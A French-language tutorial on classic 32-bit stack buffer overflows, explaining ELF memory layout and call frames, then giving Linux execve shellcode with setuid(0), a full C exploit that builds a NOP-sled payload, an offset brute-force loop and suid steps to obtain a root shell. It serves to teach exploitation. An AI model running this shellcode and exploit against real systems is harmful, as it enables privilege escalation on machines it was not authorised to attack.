# Buffer overflow

Le buffer overflow est une technique d'exploitation d'un binaire visant, par dépassement d'un tampon à prendre le contrôle du pointeur d'instruction afin d'exécuter le code voulu, qui dans la majorité des cas est l'exécution d'un shell root.

Un [article](http://www.student.montefiore.ulg.ac.be/~blaugraud/node2.html) est particulièrement clair sur le sujet, et est largement repris ci-dessous.

## Notions
### Exécutable et mémoire
Le format d'un exécutable, dans le cas d'un ELF (Executable and Linking Format) est :

Section||Description
:-:|-|:-
ELF header||offset suivants & info
Program header table||liste des segments
.text||section 1
.rodata||section 2
...||...
.data||section n
Section header table||liste des sections

En cours d'exécution les sections seront embarqués dans des segments.

Dans l'espace virtuel, il y'a deux parties:
* user : 0x00000000 - 0xBFFFFFFF
* kernel : 0xC0000000 - 0xFFFFFFFF

L'adresse de base pour les exécutable ELF est 0x08048000.

L'organisation de l'espace utilisateur est le suivant
Section||Description|Adresse
:-:|-|:-|:-
.stack||pile du programme|&#x2191; < 0xC0000000
.bss||globales non initialisées|l
.data||globales initialisées|l
.text||code du programme|l > 0x08048000

Exemple:

    char a;                    // .bss
    char b[] = "b";            // .data

    int main() {
        char c;                // .stack
        static char d;         // .bss
        static char e[] = "e"; // .data

        return 0;
    }

### Assembleur
La pile est construite des adresses mémoires les plus grandes vers les plus petites:
* La raison est d'éviter que le programme parte en dirtection de l'espace mémoire kernel
* La conséquence est que l'allocation mémoire se fait avec une soustraction

Trois registres sont très importants:
* **%eip** :  pointe vers la prochaine **instruction** a éxécuter
* **%ebp** : **base** permettant d'accéder facilement aux arguments de la fonction et/ou aux variables locales
* **%esp** : pointe vers le prochain emplacement libre de la **stack**

Lors de l'appel d'une fonction, la fonction est organisée en mémoire dans un cadre de fonction permettant la gesition entre l'appelée et l'appelant.

Le cadre est composé:
* des arguments 
* de la sauvegarde des registres `%eip` et `%ebp` de l'appelant
* des variables locales

Ce qui donne (attention la mémoire est à l'envers par rapport au schéma précédent):

Ptr|Section|Cadre|Adresse
-:|:-:|:-|:-
-|inutilisé|libre|&#x2191; > 0x08048000
%esp &#x2197;|**var locale n**|**fct**|l 
-|...|**fct**|l 
-|**var locale 1**|**fct**|l 
%ebp &#x2197;|**%ebp (sauvé)**|**fct**|l 
-|**%eip (sauvé)**|**fct**|l 
-|**arg 1**|**fct**|l 
-|...|**fct**|l 
-|**arg n**|**fct**|l 
-|var locale|main|l < 0xC0000000

Lors de l'appel de la fonction, le protocole est le suivant.

Soit l'appel:

    fct (4, 7);
La fonction appelante va :
* placer les arguments en ordre inverse sur la pile, 
* appeler `fct` et en 
* supprimer l'espace corrspondants aux arguments sur la pile

    push   $0x7            ; Ajout du dernier argument
    push   $0x4            ; Ajout du premier argument
    call   0xadresse <fct> ; Adresse hexadécimale de fct
    add    $0x8,%esp       ; Retrait des variables de la pile (2 mots de 4 bytes)
Remarque : l'instruction `call` sauvegarde sur la pile le registre %eip. Une instruction call est donc équivalente à :

    push   %eip
    jmp    0xadresse <fct>

C'est ensuite la fonction appellée, fct, qui prend le relais. La fonction est composée d'un prologue et d'un épilogue. 
Le **prologue** permet de mettre en place son cadre sur la pile en:
* sauvegardant le pointeur de base de la fonction appelante
* allouant assez d'espace sur la pile pour ses variables locales
* éventuellement, sauvgardant les registres qu'elle va utiliser dans le but de sauvegarder les données de la fonction appelante

Soit `fct`:

    int fct(int a, int b) {
    int c = a;
    int d = b;

    return c;
    }
Le **prologue** de cette fonction ressemblera à ceci :

    push   %ebp       ; Sauvegarde du registre %ebp de l'appelant
    mov    %esp,%ebp  ; Initialisation du registre %ebp de la fonction
    sub    $0x18,%esp ; GCC réserve 24 bytes minimum
    push   %eax       ; Sauvegarde du registre de retour

L'**épilogue** d'une fonction permet de préparer le retour à la fonction appelante en :
* restaurant les registres sauvés 
* désallouant les variables locales 
* restaurant le pointeur de base de la procédure appelante
* chargeant dans le registre `%eip` l'adresse de l'instruction de la fonction appelante à exécuter.

Ce qui donne:

    pop    %eax ; Restauration du registre %eax
    leave       ; Désallocation des variables locales et restauration de %ebp
    ret         ; Retour à la procédure appelante en changeant %eip
Remarque : les instructions `leave` et `ret` sont équivalentes aux instructions suivantes :

    mov    %ebp,%esp ; leave
    pop    %ebp      ; leave
    pop    %eip      ; ret

## Le buffer overflow
### Description
Soit le programme suivant:

    #include <stdio.h>
    #include <string.h>

    void foo(char* string);

    int main(int argc, char** argv) {
    if (argc > 1)
        foo(argv[1]);

    return 0;
    }

    void foo(char* string) {
    char buffer[256];
    strcpy(buffer, string);
    }

Le prologue de `foo` est:

    push   %ebp
    mov    %esp,%ebp
    sub    $0x108,%esp 
Le compilateur alloue 0x108 = 264 octets, or la taille de `buffer` est de 256. Cela nous permet de reconstituer le cadre de la fonction comme suit:

Ptr|Mémoire
-:|:-:
BP-264 &#x2197; <br><br><br><br> BP &#x2198;|buffer
BP+4 &#x2198;|%ebp (sauvé)
BP+8 &#x2198;|%eip (sauvé)

Le but du buffer overflow est de dépasser l'espace alloué pour la variable `buffer` jusqu'à écrire dans la zone mémoire de `%eip` pour y placer l'adresse de l'instruction qui nous intéresse.

Avant toute chose, il est important de garder en tête que toute chaîne passée en argument du binaire se vera concaténer le caracère `\0`, il faut donc toujours garder en tête que la taille de la chaîne fait en réalité un octet de plus.

Si on se refère au cadre de la fonction ci-dessous, `%eip` se situe à 264+4= 268 octets du début du buffer, pour se terminer 4 octets plus loin. 

Si on passe:

    $ ./a.out `perl -e 'print "A"x272'`
`%eip` va donc essayer d'exécuter l'instruction présente à l'adresse 0x41414141. Ce qui va nous amener un segmentation fault.

### Exploitation
Un premier moyen d'exploiter le buffer overflow est de créer déni de service. Pour se faire il suffit d'écraser `%eip` lors de l'appel d'une fonction avec l'adresse de cette même fonction qui va donc indéfinitivement s'appeler provoquant le crash.

L'autre moyen plus intéressant est d'exploiter le buffer overflow pour détourner le binaire de son usage premier et obtenir un shell avec les droits root. Pour cela il faut mettre en oeuvre:
* un **shellcode** : le code assembleur permettant l'exécution d'un shell
* un **exploit** : c'est le programme en charge de l'exploitation. Il va appeler le programme vulnérable, pour y injecter le payload
* un payload : c'est le vecteur (une chaîne par exemple) comprenant ce qu'il faut pour bien exploiter la faille, incluant le shellcode et l'adresse de retour

#### Le shellcode
Pour écrire un shellcode il faut :
* écrire un petit programme, compilé en static, lançant `/bin/sh` avec la fonction `execve`
* étudier le code ASM de la fonction `main` puis de la fonction`execve`
* Une fois extrait les instructions nécessaires, on les mets dans un programme C via la directive `__asm__();`. 
* Une fois compilé on demande à gdb via `x/bx` de nous donner les octets utilisés
* Il ne reste plus qu'à concaténer les octets dans un tableau d'octets. Par exemple:

    char shellcode[] =
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

#### L'exploit
Deux points sont indispensables:
* la génération du payload
* l'adresse du shellcode en mémoire

Tout d'abords, déterminons la **taille du payload** dans le cas du `buffer` précédent de 256 octets.

    Taille du payload = Taille du buffer + 2*4 + 1
Avec:
* taille du buffer sur la pile, donc avec l'éventuel padding et non dans le code. Ici 264 et pas 256
* 2*4 : sauvegader `%eip` et `%ebp`
* 1 : le `\0`

Donc 264 + 8 + 1 = 273 bytes

Ensuite déterminons la **forme du payload**, avec en première ligne les tailles :
buffer+4-strlen(shellcode)|strlen(shellcode)|4|1
:-:|:-:|:-:|:-:
NOP NOP NOP NOP .......... NOP|shellcode|Ret|O

Avec:
* la suite d'instruction NOP (`0x90`) pour donner de la souplesse sur le calcul de l'adresse de retour, sinon il faut être à l'octet près. La taille `buffer` est celle sur la pile.
* le shellcode
* l'adresse de retour
* le caractère `\0`

**Remarque** : Si le buffer ne peut inclure le shellcode avant d'atteindre `%eip`, alors il faudra positionner le shellcode après `%eip`.


Il nous faut maintenant connaître l'**adresse de retour**. Pour la déterminer, nous allons récupérer la valeur de `%esp` dans notre programme C grâçe au mécanisme de mémoire virtuelle et du format ELF. C'est le but de la fonction :

    long getESP(void) {
        __asm__("mov    %esp,%eax");
    }

Enfin l'exploit prend un argument, c'est l'`offset` qu'il faudra ajouter à la valeur de `%esp` pour remonter dans la pile et trouver le shellcode. Ce qui donne le code suivant:

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>

    #define NOP 0x90

    long getESP(void);

    int main(int argc, char** argv) {
        if (argc < 2) {
            fprintf(stderr, "No argument\n");
            return 1;
        }

        char shellcode[] =
            "\x33\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0"
            "\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
            "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

        char buffer[273];
        char* ptr = (char*)&buffer;
        int i;

        for (i = 0; i < 268 - strlen(shellcode); i++, ptr++)
            *ptr = NOP;
        for (i = 0; i < strlen(shellcode); i++, ptr++)
            *ptr = shellcode[i];

        int offset = atoi(argv[1]);
        long esp = getESP();
        long ret = esp + offset;
        printf("ESP Register : 0x%x\n", esp);
        printf("Offset       : %i\n", offset);
        printf("Address      : 0x%x\n", ret);

        *(long*)ptr = ret;
        ptr += 4;
        *(char*)ptr = '\0';

        execl("/home/sdi/overflow/prog1", "prog1", buffer, NULL);
    }

    long getESP(void) {
    __asm__("mov    %esp,%eax");
    }

Pour déterminer l'offset, on peut passer par un bout de code bash, les tentant tous un par un dans un boucle infini en partant de -1:

    A=-1; while [ 1 ]; do A=$((A+1)); ./a.out $A; done

Nous allons ainsi finir par obtenir un terminal utilisateur.

Pour obtenir un terminal root, il faut que le propriétaire du binaire vulnérable soit le root. 
Le bit `suid` dans les droits d'un fichier exécutable signifie que ce fichier sera exécuté au nom de son véritable propriétaire, peu importe l'utilisateur qui lance le programme.

Si on change les droits de notre programme:

    # chown root:root prog1
    # chmod 4755 prog1

Et qu'on revient en utilisateur, puis que l'on relance l'exploit, nous obtenons un shell root

#### Les bits uid
En examinant le code de l'exploit, on peut remarquer que le shellcode commencent par deux instructions :

    \x33\xc0\x31\xdb
    \xb0\x17\xcd\x80
Soi les fonctions C suivantes :

    setuid(0);
    setgid(0);

L'`uid` identifie l'utilisateur. 
L'`euid` dans un processus identifie l'utilisateur à l'origine du processus. 
Les shells récents comparents si leur `euid` est similaire à l'`uid` de l'utilisateur qui les appelle. Si ce n'est pas le cas, ils fixent leur `euid` à l'`uid` comparé. 
Donc si nous ne mettons pas ces deux instructions, le shell obtenu aurait été seulement utilisateur. Pourquoi ?
Parce que l'`uid` de l'appelant (utilisateur) étant différent du `euid` du shell (root), le shell corigerait son `euid` avec m'`uid` utilisateur.

#### Remote Exploit
Les remote exploits contiennent un shellcode qui va ouvrir un port TCP, défini au préalable, sur lequel un terminal sera exécuté. 
Le problème est qu'on ne peut pas effecteur une estimation de l'adresse de retour sur base du contenu du registre `%esp`. 

Pour palier à ce problèmen il faut recréer l'environnement de la machine distante, (0S, processus, et versions similaires) et tout calculer à la main.

#### Quelques fonctions vulnérables
* strcpy()
* gets()
* strcat()
* sprintf(), vsprintf()
* scanf(), fscanf(), sscanf(), vscanf(), vsscanf(), vfscanf()
* etc...

## Liens
* http://www.student.montefiore.ulg.ac.be/~blaugraud/node2.html
* https://beta.hackndo.com/buffer-overflow/
* http://phrack.org/issues/49/14.html